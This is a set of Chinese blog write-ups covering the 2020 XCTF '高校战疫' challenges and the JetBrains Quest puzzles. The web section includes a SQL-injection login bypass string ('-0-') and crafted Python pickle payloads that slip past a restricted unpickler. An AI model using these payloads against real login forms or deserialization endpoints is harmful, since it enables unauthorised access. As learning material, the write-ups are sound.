于是上周末就水了一下，然而啥也不会菜到爆炸，都没几道题会做……（后面还补作业瞎折腾去了 最近看了看大佬们的 WP，估计在他们眼里都是签到题吧，啥也不说直接丢一个 payload 搞定走人（awsl。 不过还是有点感受或者其他方面的收获之类的，顺便来学点东西，随便写一点吧。 官方 WP： 点这里下载 （版权归官方所有） 好像好多环境都关了。 （话说这篇文章丢 draft 里好久了唉，再不发就要长草了。 MISC2019-nCoV真·签到 flag{shijiejiayou} 武汉加油！中国加油！世界加油！ 简单MISC压缩包里有一个flag.zip（加密） 和一个photo.jpg（打不开）。 photo.jpg 经过提取得到一个zip文件。 里面有一个 ctf.txt 文件，里面是 ./.--./../-.././--/../-.-./.../../-/..-/.-/-/../---/-./---/..-./..-/-./../...-/./.-./.../../-/-.--/.--/.-/.-. 一看是摩斯密码，解密得到 EPIDEMICSITUATIONOFUNIVERSITYWAR （嗯 EPIDEMIC SITUATION OF UNIVERSITY WAR 嘛。高校战疫啦。 作为密码，解压flag.zip文件，得到flag.txt VGgxc19pc19GbGFHX3lvdV9hUkVfcmlnSFQ= base64解密得到flag： Th1s_is_FlaG_you_aRE_rigHT 隐藏的信息压缩包里有个二维码.jpg，以及 纯数字.zip。 其中压缩包加密了。 发现二维码被扣掉了三个定位脚而且反色了，于是补全 扫码得到（可能补得不是很好，但发现手机 QQ 的扫码真的强 flag{this_is_also_not_flag} 解压密码不在这里0.0！ 假的flag！发现并不能解压。 同时在十六进制编辑器里看到最后有一段字符串：TOGETYOURFLAG。（有点懵，好像没啥用的亚子 再看回压缩包，根据文件名 纯数字，于是暴力跑了一波，然而并不行。 于是想到伪加密，果然如此。 解压得到隐藏的信息.wav，音频内容大概就是 我的武汉尽快好起来 之类的，挺应景的，也挺励志的。 在音频最后发现了比较微弱的拨号声音，看了看频域，发现了如下的频谱。（在最前面和最后面都有这样的信号） 每个拨号声由两个频率叠加而成。 想起来刚放寒假的时候有个学弟还问过拨号的原理，那时候还答不上来，查了半天没找到合适的资料。 这次再去谷歌查了一下，发现原来这叫做 DTMF 信号。 双音多频信号（Dual-Tone Multi-Frequency, DTMF），电话系统中电话机与交换机之间的一种用户信令，最常用于发拨号时送被叫号码。 双音多频的拨号键盘是4×4的矩阵，每一行代表一个高频，每一列代表一个低频。每按一个键就发送一个高频和低频的正弦信号组合，比如’1’相当于697和1209赫兹（Hz）。交换机可以解码这些频率组合并确定所对应的按键。 （来自维基百科） 1209 Hz 1336 Hz 1477 Hz 1633 Hz 697 Hz 1 2 3 A 770 Hz 4 5 6 B 852 Hz 7 8 9 C 941 Hz * 0 # D 本来想利用网络上在线的解码工具，然而发现网站不是上不去就是停止服务了。（噗 那还是自己来吧。 对于每一位号码分别查看频谱，根据最接近的低频和高频信号对应于表格内的数字/字母。（挺佩服直接就听出来的大佬 得到音频最后面这几个数字为 5618521，最前面的几个为 18748。 凑成 flag{187485618521} 交上去，不对！ 难道两部分反了？于是倒过来再试，不行。 难道要倒叙？不行。 难道是字母？于是转成键盘上1-0对应着下面的一行字母，试了试，不行。 难道是哪个数字搞错了？？？再确认了一遍，队友也确认了一遍，就是这个啊（黑脸。 Base64 解码一下，不对不可能。 于是卡在这里了。 看到别人 WP 的时候发现蠢死了，想到 base64 解码没想到反过来编码…… 然而人家二维码里给提示了，只是提示不在结尾而已。 呐，USEBASE64TOGETYOURFLAG. 下次得先用 strings 来看看…… 于是 flag 就是 flag{MTg3NDg1NjE4NTIx}。 找资料的时候发现了有大佬在单片机上实现 DTMF 软解码的。 在线生成某种特定音调的网站：http://onlinetonegenerator.com/dtmf.html 其他一些资料： 另一个在线 DTMF 生成工具 DTMF Tone Generator 一个在线 DTMF 解码工具 Detect DTMF Tones（好像上不去） DTMF 编码及解码 GitHub项目： DTMF_Detector 📞 Using Matlab to simulate Dual-Tone Multi-Frequency (DTMF) of telephone DTMF-Detection-Goertzel-Algorithm- DTMF detection system developed on AVR Atmega128 board based on Goertzel algorithm 武汉加油发现附件只有一张图片↓。 首先祝武汉加油，中国加油，向医护人员致敬。 发现了文件拼接了一个 RAR 文件，foremost 提取不出来，懒得开 Ubuntu 用 binwalk 了，于是直接手动提取出压缩包。 得到一个flag.exe. 什么？MISC 题还要 RE？？？ 然而看了一下发现解不了，好像加壳了。 随便猜了一下和武汉加油相关的 flag 交上去，都不对…… 看了大佬们的 WP 发现是 flag{zhong_guo_jia_you} … 中国加油！ （佩服直接猜出来的） 原来图片里还隐写了密码，用 steghide 爆破提取出 ﬂag.txt，可以得到密码' 武 汉 加 油 !，输入到 flag.exe就可以得到 flag。（emmm ez_mem&amp;usbMISC 是真的杂…… captured.pcap抓包文件，可以在一堆流量中提取出一个上传文件的页面upload_file.php。 从提交的 form 里可以提取出一个 data.zip. 压缩包里是一个 data.vmem，噫一个虚拟机内存镜像。 懵了，没玩过内存取证的题目唉（好菜啊 看题目后面应该还需要提取 USB 的数据，大概 flag 在 USB 数据里吧。 后面有空再学学 volatility 内存取证。 Websqlcheckin http://121.37.161.79:8005 就是输入用户名和密码登录那种，用 PHP 的 PDO 来连接数据库。用户名需要为admin。 毕竟是 checkin 题，感觉应该不会太难。然而试了试常用的万能密码发现并没有效果，都被 Deny 了。 然后队友在网上搜到了原题—— 湖南省第三届大学生信息安全水赛WriteUp. '-0-'可以代替'or'1绕过。于是构造参数如下即可。 username=admin&amp;password='-0-' 立个 flag，后面好好学一下 SQL（ webtmp http://121.36.222.22:10019/ 源码： import base64 import io import sys import pickle from flask import Flask, Response, render_template, request app = Flask(__name__) class Animal: def __init__(self, name, category): self.name = name self.category = category def __repr__(self): return f'Animal(name={self.name!r}, category={self.category!r})' def __eq__(self, other): return type(other) is Animal and self.name == other.name and self.category == other.category class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module == '__main__': return getattr(sys.modules['__main__'], name) raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" % (module, name)) def restricted_loads(s): return RestrictedUnpickler(io.BytesIO(s)).load() def read(filename, encoding='utf-8'): with open(filename, 'r', encoding=encoding) as fin: return fin.read() @app.route('/', methods=['GET', 'POST']) def index(): if request.args.get('source'): return Response(read(__file__), mimetype='text/plain') if request.method == 'POST': try: pickle_data = request.form.get('data') if b'R' in base64.b64decode(pickle_data): return 'No... I don\\'t like R-things. No Rabits, Rats, Roosters or RCEs.' else: result = restricted_loads(base64.b64decode(pickle_data)) if type(result) is not Animal: return 'Are you sure that is an animal???' correct = (result == Animal(secret.name, secret.category)) return render_template('unpickle_result.html', result=result, pickle_data=pickle_data, giveflag=correct) except Exception as e: print(repr(e)) return \"Something wrong\" sample_obj = Animal('mmm','aaaa') pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode() return render_template('unpickle_page.html', sample_obj=sample_obj, pickle_data=pickle_data) if __name__ == '__main__': app.run(host='0.0.0.0', port=5000) （可能有些地方被我不小心改了 看到 pickle 想到了反序列化，之前只听说过 PHP 有反序列化漏洞，这里才知道原来 python 也有。 这次正好就来了解一下 pickle 反序列化吧。 后面再记一下这一块的笔记吧（大概率咕咕咕 可以用 pickletools 这个反汇编工具来帮助理解 pickle 代码，即opcode 。 比如这里把name设成 'mmm'，category设为 'aaaa'，而后生成 pickle，可以看到各个命令的含义。 $ python3 -m pickletools -a ./data 0: \\x80 PROTO 3 Protocol version indicator. 2: c GLOBAL '__main__ Animal' Push a global object (module.attr) on the stack. 19: q BINPUT 0 Store the stack top into the memo. The stack is not popped. 21: ) EMPTY_TUPLE Push an empty tuple. 22: \\x81 NEWOBJ Build an object instance. 23: q BINPUT 1 Store the stack top into the memo. The stack is not popped. 25: } EMPTY_DICT Push an empty dict. 26: q BINPUT 2 Store the stack top into the memo. The stack is not popped. 28: ( MARK Push markobject onto the stack. 29: X BINUNICODE 'name' Push a Python Unicode string object. 38: q BINPUT 3 Store the stack top into the memo. The stack is not popped. 40: X BINUNICODE 'mmm' Push a Python Unicode string object. 48: q BINPUT 4 Store the stack top into the memo. The stack is not popped. 50: X BINUNICODE 'category' Push a Python Unicode string object. 63: q BINPUT 5 Store the stack top into the memo. The stack is not popped. 65: X BINUNICODE 'aaaa' Push a Python Unicode string object. 74: q BINPUT 6 Store the stack top into the memo. The stack is not popped. 76: u SETITEMS (MARK at 28) Add an arbitrary number of key+value pairs to an existing dict. 77: b BUILD Finish building an object, via __setstate__ or dict update. 78: . STOP Stop the unpickling machine. highest protocol among opcodes = 2 看了半天反序列化漏洞，大部分都是利用__reduce__方法来实现任意代码的执行。 如果没有输出的话，可以反弹 shell 到自己的服务器上，利用网站访问日志来得到需要的信息。 （这时我看了看服务器的 nginx log，发现日常被扫，常见的 admin、phpmyadmin 目录，甚至还有想跨站执行 rm -rf / 的…… 话说回来，当我写好 __reduce__ 方法 post 上去之后，发现被拒绝了。不过代码里也有体现。 然而想要将 callable 对象执行都必须要调用 reduce，在 pickle 中都会涉及 R 这个字母。 于是乎不能在服务器上通过执行自己的代码来获取 flag。 后面突然想到，你不让我 RCE，我可以改掉你的 secret 中的 name 和 category 啊！ 这里要手搓 pickle 了。当时的思路是调用 secret 模块的内容对 Animal 进行实例化。然而比较菜，不知道为啥出了点问题。 后来又想到读取 secret 文件读取属性信息进而获取 flag，不过没有具体的思路，于是到这里就卡住了。 后来看到大佬的 WP，发现果然是**直接改掉这个secret**。 不过具体不是调用 secret 模块，而是直接在 __main__ 下建一个自己的secret类，设置自己的属性，覆盖掉 import 进来的secret。再利用自己设置的属性信息去校验就完事了。 payload = b\"\\x80\\x03c__main__\\nsecret\\n} (X\\x04\\x00\\x00\\x00nameX\\x03\\x00\\x00\\x00233X\\x08\\x00\\x00\\x00categoryX\\x03\\x00\\x 00\\x00233ub0c__main__\\nAnimal\\n)\\x81} (X\\x04\\x00\\x00\\x00nameq\\x03X\\x03\\x00\\x00\\x00233X\\x08\\x00\\x00\\x00categoryX\\x03\\ x00\\x00\\x00233ub.\" 另一个 payload： b\"c__main__\\nsecret\\np0\\n0g0\\n(}(S'name'\\nS'asd'\\ndtbg0\\n(}(S'category'\\nS'123'\\ndtb\\x80\\x04\\x95=\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x08__main__\\x94\\x8c\\x06Animal\\x94\\x93\\x94)\\x81\\x94}\\x94(\\x8c\\x04name\\x94\\x8c\\x03asd\\x94\\x8c\\x08category\\x94\\x8c\\x03123\\x94ub.\" # base64 Y19fbWFpbl9fCnNlY3JldApwMAowZzAKKH0oUyduYW1lJwpTJ2FzZCcKZHRiZzAKKH0oUydjYXRlZ29yeScKUycxMjMnCmR0YoAElT0AAAAAAAAAjAhfX21haW5fX5SMBkFuaW1hbJSTlCmBlH2UKIwEbmFtZZSMA2FzZJSMCGNhdGVnb3J5lIwDMTIzlHViLg== 下面这个链接里有关于 pickle 及其反序列化漏洞的更完整的介绍。 🐍 Security Issues in Python Pickle （Scientific Network needed What is serialization, How to serialize data, Pickle in CTF Challenges, Implementation of Pickle, Vulnerabilities in Wild, Mitigation strategies &amp;&amp; Best practices… 里面讲到了几个例题 2019-SJTU-Pickle2019-SJTU-Pickle-Revenge-Back2018-HITB-Python-Revenge2019-SJTU-Pickle-Revenge （←这个题就和这里这题几乎一个套路 不允许R，他这里的注入思路也是调用 secret 模块的内容对 Animal 进行实例化，有点想不明白我写的哪里出问题了（ 他还进一步实现了对文件的读取。最后的结论是，放弃使用pickle。毕竟太危险了呀！ Extensive Reading: Python Pickle的任意代码执行漏洞实践和Payload构造 绕过 RestrictedUnpickler Python反序列化漏洞的花式利用 关于Python sec的一些简单的总结 Else其他的题大概看了看。。不过没什么思路或者有思路不知道怎么实现，好菜啊…… （怎么大佬们动不动随手就一个 payload 搞定了嘤嘤嘤 小结再回过头来看这次 CTF 的比赛名称，高校战“疫”网络安全分享赛。 还是挺有意思的吧。主题结合了当下的热点，题目也比较应景，也挺正能量的。 COVID-19 面前，不仅仅需要中国努力，更需要全世界一起行动起来，共同与疫情进行较量。 这是整个人类共同面临的困难和挑战，从中也更能意识到人类命运共同体的含义了。 武汉加油，中国加油，世界加油！ 再看 CTF，感觉涉及的面不是一般的广，更多的是想来学点东西吧，你看人家大佬都比你厉害呢。 其中的 MISC 题经常需要不小的脑洞，比如 武汉加油、隐藏的信息 之类的题目就是呢。 或许这就是CTF的魅力吧！ 可能文中有的表述不大严谨，不要太在意（ 这篇其实写的也很水 （溜","path":"2020/03/15/CTF_2020XCTF_gxzy/"},{"title":"CTF | JetBrains Quest 3 WriteUp/攻略","text":"Cause晚上看到 JetBrains 最后一个 Quest 出来了，于是继续来解个谜吧！ 前两个 JetBrainsQuest 的 WriteUp 在这里↓呢。 CTF | JetBrains Quest 1&amp;2 WriteUp/攻略 这次的难度比上次要大一些，不过总体而言也不太难啦。 ATTENTION! 下面的内容 涉及剧透！ 如果想自己做的话，就暂时不要往下看了！ Step 1推特地址： https://twitter.com/jetbrains/status/1238420744817782784 噫！这是最后一个 quest 了！来解密吧~ SGF2ZSB5b3Ugc2VlbiB0aGUgcG9zdCBvbiBvdXIgSW5zdGFncmFtIGFjY291bnQ/ base64 解密得到 Have you seen the post on our Instagram account? 去 Instagram 找找线索。 Step 2前往 JetBrains 的Ins： https://www.instagram.com/jetbrains/ 第一张图就是熟悉的 Quest 领取福利的页面背景了。 （留个备份链接 Welcome to the final Quest! You should start on the Kotlin Playground: https://jb.gg/kotlin_questP.S. If you don’t know about the #JetBrainsQuest, it’s not too late to find out. 得到一个网址：https://jb.gg/kotlin_quest Step 3访问上面的网址，发现跳转又跳转，最终来到了一个 Kotlin 在线编程页面。 就是他说的 the Kotlin Playground 吧。 地址在这里 （链接太长了就不显示出来好了 fun main() { val s = \"Zh#kdyh#ehhq#zrunlqj#552:#rq#wkh#ylghr#iru#wkh#iluvw#hslvrgh#ri#wkh#SksVwrup#HDS1#Li#zh#jdyh#|rx#d#foxh/#lw#zrxog#eh#hdv|#dv#sl1\" val n: Int = TODO() for (c in s) { print(c - n) } } 这个含义很明显呢。就是把字符串 s 每个字母往前移动 n 个字符好了。（i.e. SHIFTx，凯撒密码之类的） 我也不记得 n 是多少了emmm，反正个位数吧，试一试就出来了。 于是得到 We have been working 22/7 on the video for the first episode of the PhpStorm EAP. If we gave you a clue, it would be easy as pi. 关键词：video，PhpStorm EAP，pi。 盲猜就与 3.14/3.1415926 之类的有关。 Step 4搜索 PhpStorm EAP，来到了他的网站。 噢这是个 PHP 的 IDE 啊。EAP 相当于预发布版本？ PhpStorm Early Access Program At JetBrains, we believe that to make great tools for developers, we should listen to and involve developers. Our Early Access Program (EAP) lets our development community participate in the product discussions and influence development planning, from the very early stages. 在页面上没有找到 quest，也没找到视频及其链接，看了一下最新的版本是 2020.1 EAP build 201.6251.26 Released: March 12, 2020。 看了一下 Blog &amp; Social，来到 PHPSTORM 的 blog，看到了最新版本发布的 Post。 好了，有视频链接了！What’s Coming in PhpStorm 2020.1 在 What’s Coming in PhpStorm 2020.1 – EAP Series | Season 2020.1 Episode 1 这个视频里，重点关注 PI 即 3’14’’ 附近的内容。 发现画面抖动了两下 emmm 有猫腻！ 猜想线索藏在抖动的位置，然而看了几遍，甚至开到最慢的 0.25 倍速，都没看出来 emmm（好菜啊 于是找了个工具把这个视频下载下来，放 Premiere 里逐帧看。 裁剪了，放大再看这1秒多的片段。最后发现 homepage 这里发生了变化。 原来他的意思是 clue 在这两段抖动之间啊！ 于是得到下一个链接：https://jb.gg/31415926 的确与 PI 有关呢（ 有意思的是，这个视频2月10日就发布了，真是蓄谋已久啊 233333. 看评论区还有人一个月前疑惑呢。 Step 5访问 https://jb.gg/31415926 301跳转到 https://www.quiz-maker.com/Q2723CE （发现这个 www.quiz-maker.com 是个挺不错的在线 quiz 网站呢 The Easiest #1 Rated Online Quiz Maker Publish your quiz in a matter of minutes. Go ahead Try it now! 然后需要你在 1min 内回答关于 JB 的一些问题。 （真挺好，顺便宣传一下自己。 做不对再重来，然后发现每次还有新的题目（黑脸 然后我做了好多次，发现谷歌搜索的 精选摘要 真的好用。 最后终于全对了。 Almost there! The last challenge is in the Tips of the Day of a specific IntelliJ IDEA Community version from our latest build page in Confluence, but… there is a catch. You have to know which version to look for. To find the build number, you need sight beyond sight: . Not Everything Today Does All You Could Ask. Lessons Learned From Other Relevant Solutions, Possibly Even Another Kind Emerge. Risking Sometimes Being Liberal Or Generous Proves Ordinary Simple Tests Infinitely More Annoying. Get Examining Hidden Initial Designated Early Symbols. They Have Everything Needed, Except Xerox, To Completely Level Up Everything. 看来与 Tips of the Day of a specific IntelliJ IDEA Community version 有关，藏在每日提示里可还行，而且还是一个神秘的版本。这个版本部署在 Confluence 上面。 下面这段话有点摸不着头脑。 不管了先去 IDEA 网站上看看，难道顺便骗一波下载量？？？ Step 6访问 IDEA 官网，顺着 Release Notes，来到了这里。 第一个就是吧。还是几个小时前刚发布的呢！ 就是这个：IDEA 2020.1 Quest Build Edition 下载下来而后安装。什么，1.4GB？？？ 随便了随便了，装完卸掉好了。（不过听说用来写 Java 挺好用的 （估计这里还能引一波流呢 Step 7装好了随意建一个项目，唤出 Tip of the Day. 翻了几页之后找到了。 JETBRAINS QUEST: LAST PUZZLE You have discovered our JetBrains Quest! If you don’t know what this is, you should start from the beginning. This is it. The last puzzle. You are just one step away from glory!Now you just need the Key to unlock the Quest page.The Key is the first and last 4 digits of the 50 * 10^6 position of the Fibonacci sequence (F(50 Million)).As you may know by now, not all that glitters is gold, and to solve this puzzle you should not go straight for the obvious answer. May you make a glorious choice. Remember that you have until the 15th of March 12:00 CEST. 所以这里要找到 the first and last 4 digits of the 50 * 10^6 position of the Fibonacci sequence (F(50 Million)) 即 Fibonacci 数列 50×10^6 位置的前4位和后4位。 Quest Page 就是之前的 https://www.jetbrains.com/promo/quest/ Beat the Quest那就算吧，前四位好算，后四位有点难顶。 搜了一下Google发现出不来。 不过懒得手撸代码算了，直接找 wolframalpha 吧！ 前四位是4602。后四位的话，mod 10000出结果。 得到后四位为3125。 于是 Code 就是 46023125啦！ 所以最终得到的是 JB 家全家桶八折券 emmmm （还以为是六个月授权凑成一年的呢 不管了，反正本来就有教育授权不差这个（ 好玩就行了 23333 如果你需要的话，Remember that you have until the 15th of March 12:00 CEST. 再看 Step 5 中的 Clue本来本文到这里就结束了，然后想起来之前的 clue 有点想不通，再来看看。 . Not Everything Today Does All You Could Ask. Lessons Learned From Other Relevant Solutions, Possibly Even Another Kind Emerge. Risking Sometimes Being Liberal Or Generous Proves Ordinary Simple Tests Infinitely More Annoying. Get Examining Hidden Initial Designated Early Symbols. They Have Everything Needed, Except Xerox, To Completely Level Up Everything. 看了一些 V2EX 上的讨论，发现只看首字母可以拼出一句话。 .net day call for speakers blog post image hides the next clue 搜了一下，来到了这里。 JetBrains .NET Day Online 2020 – Call for Speakers 在这张图片这里找到了线索。（噗 you_are_looking_for_build_201-6303 不过问题不大2333. 反正也找到了呢。 Extensive Reading再看了看大佬们的讨论，发现有大佬用 rust 写了个 jio本 算出了后四位。 fn main() { let mut a2: u128 = 1; let mut a1: u128 = 1; for i in 3..=50000000 { //for i in 3..=50 { let new = a2 + a1; a2 = a1; if new &gt; 10000 { a1 = new % 10000; } else { a1 = new; } if i % 10000 == 0 { print!(\"\\r[{}]\", i); } } println!(\"\\nok: {}\", a1); } 他的思路是： 后四位我自己写程序跑，超过四位数就减掉一万，等于只算最后四位。 还有大佬发现了 Fib 数列是有规律的↓。 http://www.maths.surrey.ac.uk/hosted-sites/R.Knott/Fibonacci/fibmaths.html#section1.1 etc. 题外话今天是 PI 日，节日快乐呀！ 最近对博客进行了一些优化，或者说是除草了，懒得开新文章写了。 主要让常用的 JavaScript、CSS、一些背景图片走 jsdelivr 的 cdn，优化一点加载速度。 然后修改了 hexo 的 feed 插件，把 RSS 中的 summary 优化为了文章的摘要（原来是截取全文最开始的一部分文字，还保留着一堆标签，丑死了）。期间还发现报错了，后来去 Github 参考了大佬们更新的源码改了一下模板。 这样 RSS 的效果就好多了。 欢迎大佬们关注，和我交换友链呀！ RSS 地址：https://miaotony.xyz/atom.xml （感觉越写越水了 （溜了溜了","path":"2020/03/14/CTF_2020JetBrainsQuest3/"},{"title":"CTF | JetBrains Quest 1&2 WriteUp/攻略","text":"前言昨晚在 Telegram 里看到朋友发了一个 JetBrains Quest 的 twitter 链接，据说难度不大，还可以白嫖他家的产品授权。 感兴趣就来体验一下吧！ 于是体验了 Quest1 和 2 白嫖了 3+3 个月的 JB 家全产品授权，这里记录一下通关过程，也算是攻略 / WriteUp 吧。 感觉也是 CTF, Capture The Flag 的范畴吧，暂且就归类为 CTF 好了（ 欢迎来和我交流哈。 PAY ATTENTION! 注意！ 如果没有玩过的话 本文下面的内容 全 是 剧 透！ 如果想自己做的话，就暂时不要往下看了！ 这个 Quest 在 2020-03-15 12:00 CET （欧洲中部时间）之前都有效。 Quest 1https://twitter.com/jetbrains/status/1236986174075482113 48 61 76 65 20 79 6f 75 20 73 65 65 6e 20 74 68 65 20 73 6f 75 72 63 65 20 63 6f 64 65 20 6f 66 20 74 68 65 20 4a 65 74 42 72 61 69 6e 73 20 77 65 62 73 69 74 65 3f 一看是 hex，于是转成 ASCII，得到： Have you seen the source code of the JetBrains website? Step 1去官网上找呗。传送门：https://www.jetbrains.com/ （还别说，挺久没上 JetBrains 官网了，感觉又多了不少工具，界面也变得更好看了唉。 提示了看源码，既然是 JetBrainsQuest 了，当然就**搜一下quest**。 果然看到了提示。 &lt;!-- O {o)xxx|===============- O Welcome to the JetBrains Quest. What awaits ahead is a series of challenges. Each one will require a little initiative, a little thinking, and a whole lot of JetBrains to get to the end. Cheating is allowed and in some places encouraged. You have until the 15th of March at 12:00 CET to finish all the quests. Getting to the end of each quest will earn you a reward. Let the quest commence! JetBrains has a lot of products, but there is one that looks like a joke on our Products page, you should start there... (hint: use Chrome Incognito mode) It’s dangerous to go alone take this key: Good luck! == Jrrg#oxfn$ O -===============|xxx(o} O --&gt; 这里提示了hint: use Chrome Incognito mode。 建议用 Chrome 的无痕模式。 Step 2于是就去 products 里找了呗。 （可能没注意）没找到入口，盲猜就在 /products 目录了，访问后跳转到了 https://www.jetbrains.com/products.html 。 后来发现主页上的链接在 See All Tools 里（ 找找哪个looks like a joke，一猜就是 JK 了，而且还是2020.1.1版本（嘻嘻 。 后来发现，JK 这个产品可能需要在 无痕模式/隐私模式 下才出现。（有可能有缓存？ 后面再来分析一下这个怎么加载出来的8. Step 3找一下 500 到 5000 之内有多少素数，随手写个 py 的 jio 本。 （边界值的话，5000肯定不是素数，不影响结果 from math import sqrt cnt = 0 for i in range(500, 5000): for j in range(2, int(sqrt(i))+1): if i % j == 0: break if j == int(sqrt(i)): cnt += 1 print('OK!') print(cnt) 跑出来 cnt 为 574. 于是访问 https://jb.gg/574 .（不输入的话是跳转到官网的 （其实爆破也行，反正就三位数呢 发现 301 重定向到了 https://www.jetbrains.com/help/pycharm/getting-help.html#quest 。 Step 4Google 上一搜就是了。 （下面还有 V2EX 上别人的讨论 （（不看不看先不看！ https://youtrack.jetbrains.com/issue/MPS-31816 这是 YouTrack 的一个 issue。（这里直接谷歌可能是非预期解了 JetBrains Quest “The key is to think back to the beginning.” – The JetBrains Quest team Qlfh$#Li#|rx#duh#uhdglqj#wklv#|rx#pxvw#kdyh#zrunhg#rxw#krz#wr#ghfu|sw#lw1#Wklv#lv#rxu#lvvxh#wudfnhu#ghvljqhg#iru#djloh#whdpv1#Lw#lv#iuhh#iru#xs#wr#6#xvhuv#lq#Forxg#dqg#iru#43#xvhuv#lq#Vwdqgdorqh/#vr#li#|rx#zdqw#wr#jlyh#lw#d#jr#lq#|rxu#whdp#wkhq#zh#wrwdoo|#uhfrpphqg#lw1#|rx#kdyh#ilqlvkhg#wkh#iluvw#Txhvw/#qrz#lw“v#wlph#wr#uhghhp#|rxu#iluvw#sul}h1#Wkh#frgh#iru#wkh#iluvw#txhvw#lv#‟WkhGulyhWrGhyhors†1#Jr#wr#wkh#Txhvw#Sdjh#dqg#xvh#wkh#frgh#wr#fodlp#|rxu#sul}h1#kwwsv=22zzz1mhweudlqv1frp2surpr2txhvw2 结合 Step1 中的 Good luck! == Jrrg#oxfn$，分析可知是往后移了3个字符（SHIFT3）。 于是全部往前移3个字符得到： Nice! If you are reading this you must have worked out how to decrypt it. This is our issue tracker designed for agile teams. It is free for up to 3 users in Cloud and for 10 users in Standalone, so if you want to give it a go in your team then we totally recommend it. you have finished the first Quest, now it…s time to redeem your first prize. The code for the first quest is &lt;TheDriveToDevelop&lt;. Go to the Quest Page and use the code to claim your prize. https://www.jetbrains.com/promo/quest/ Beat The QuestRua！哇好耶！ TheDriveToDevelop 然后就可以拿着这个 code 去白嫖免费授权了！ 输入邮箱和上面的 Code，提交就好啦。 这里看到 Twitter 上有人说 Firefox 会报 CORS issue，请使用 Chrome 试试。 (An error occurred while … 这里说了会把你的信息提供给他，他会给你的邮箱发推荐信息，可能这是 JetBrains 吸收流量的一个手段吧（盲猜的 不过他也说了在邮件末尾可以取消订阅。 BTW，发现这里的 Code 并没有上传到后端进行校验，而是直接在前端进行的。 可以给 Code 输入框的 input 打个断点看看（ （或者看看提交表格的 call stack 好了 于是得到了白嫖的 3-months free All Products Pack subscription。 有点意思唉~ 等等？还没完唉！ 这是一系列的 Quest！ 下一个 quest 的时间是1583924400，转换时间戳发现是 2020-03-11 19:00:00. Step2 中 JK 的加载分析突然有点好奇这个 JK 是怎么被加载出来的，于是简单分析一下吧。 这里搜索quest，在网页末尾处看到了一个加载的dialog-polyfill.js。 在 Sources 里这个文件里搜索 JK或者quest，都找不到网页上与 JK 有关信息，倒是定义了一堆相关的属性方法之类的，css 文件中是dialog框的相关样式。 在 Network 里看 products.html 的 response，里面并没有 JK，也没有quest。就连上面这个脚本文件也没有。 那这个 JK 到底是怎么加载出来的呢？ 于是**在 Network 里全局搜索了一下 quest**，有了新的收获。 原来这些信息都是通过一个JS脚本来加载的。 这个 js 的 response 包含了页面上的所有产品信息，是把网页内容嵌入到 json 里进行数据交互的。 哇，第一次见唉！😂 再看一下 Initiator，发现调用了 Googletagmanager，这是什么东西唉，之前爬虫虫也没遇到过（又是我知识盲区了 查了一下，是谷歌的标签管理器，都诞生挺久了然而并不知道。 Google Tag Manager helps make website tag management simple with tools &amp; solutions that allow small businesses to deploy and edit tags all in one place. 这里是他的官网。 上去看了一下，感觉就是可以动态修改前端的代码，不用直接修改原本的网站文件，不需要重新部署。而且还自带版本管理，可以多人合作之类的吧。 谷歌的统计也是用这个来实现的。 不过有个缺点是，国内访问比较慢而且说不定哪天就连接不上了。 emmm 后面有空感兴趣再折腾吧（ Quest 2来了来了！第二个 Quest 来了！ https://twitter.com/jetbrains/status/1237694815283879943 .spleh A+lrtC/dmC .thgis fo tuo si ti semitemos ,etihw si txet nehw sa drah kooL .tseretni wohs dluohs uoy ecalp a si ,dessecorp si xat hctuD erehw esac ehT .sedih tseuq fo txen eht erehw si ,deificeps era segaugnal cificeps-niamod tcudorp ehT 很明显倒叙了，这里反过来得到： The product domain-specific languages are specified, is where the next of quest hides. The case where Dutch tax is processed, is a place you should show interest. Look hard as when text is white, sometimes it is out of sight. Cmd/Ctrl+A helps. 提示了是个与 domain-specific languages有关的产品，quest相关的文字设置为白色的了。 Step 1谷歌搜一下，直接就得到了 JetBrains 家的 MPS (MetaProgrammingSystem) （之前也没了解过 访问它的官网吧，传送喵：https://www.jetbrains.com/mps/ Step 2在网页里同样搜一下 quest 发现有个 PDF 文件唉~ 打开来看看吧！ Step 3于是继续在 PDF 里搜索quest。 发现果然是白色的文字23333. Ctrl + A ，Ctrl + C / V，看一下那一块的文字 This is our 20th year as a company, we have shared numbers in our JetBrains Annual report, sharing the section with 18,650 numbers will progress your quest Step 4上面提示了JB 20周年年度报告，想起来官网首页上有个链接来着。 https://www.jetbrains.com/company/annualreport/2019/ 插几句题外话。 就是个年报吧，看上去 JB 的确挺受欢迎哒！（PyCharm 真挺好用的 下面这个视频封面的小黄鸭让我想到了 小黄鸭调试法 23333 （这个 Dogfooding 用的有点意思 这回再来搜索 quest。 第七届 Hackathon。（emmm &lt;span class=\"react-js-quick-share\" data-hashtag=\"JetBrainsQuest\" data-text=\"I have found the JetBrains Quest! Sometimes you just need to look closely at the Haskell language, Hello,World! in the hackathon lego brainstorms project https://blog.jetbrains.com/blog/2019/11/22/jetbrains-7th-annual-hackathon/\" data-theme=\"dark\"&gt; Step 5访问 https://blog.jetbrains.com/blog/2019/11/22/jetbrains-7th-annual-hackathon/ 重点关注 Haskell language，Hello,World!，hackathon lego brainstorms project。 看来就与这张图有关了呢！ 看来就是右边图上这段话了。emmm d1D joo KN0w J378r41n2 12 4lw4y2 H1R1Ng? ch3ck Ou7 t3h K4r33r2 P4g3 4nD 533 1f 7H3r3 12 4 J08 0R 4 KW35T 0 cH4Ll3n93 70 g0 fUr7h3r @ 13457. 草（一种植物），我大概翻译出来了！ Did you know jetbrains is always hiring? Check Out the kareers Page and see if here is a job or a kwest challenge to go further at least 形象带师 233333 （讲真，觉得 CTF 有趣的一个原因大概就是从各种奇怪的数字大小写字母混杂的形象的 flag 开始的吧 （觉得出题人脑洞就很大 比如随手来一个 → flag{1t_I5_s0_Fun_70_S33_y0u_H3r3}。😁 不过这里第一次见把2当作s的。 还有kareers应该是careers，kwest应该是quest吧 23333. 查了一下，发现原来这个叫做 Leet，又叫 黑客语。 详见 VV 1 |&lt; 1 P 3 [) 1 4 ，click here. 所以 JB 顺便再来招个聘？ 看来下一个 Step 是个与 job 有关的地方了。 Step 6在官网上找到了 Company -&gt; Careers -&gt; Jobs. https://www.jetbrains.com/careers/jobs/ 搜索Quest，发现了一个奇怪的职位。那就是它了！ 于是来到了这个页面 ↓。 233333 这里回顾了一下这一路 journey 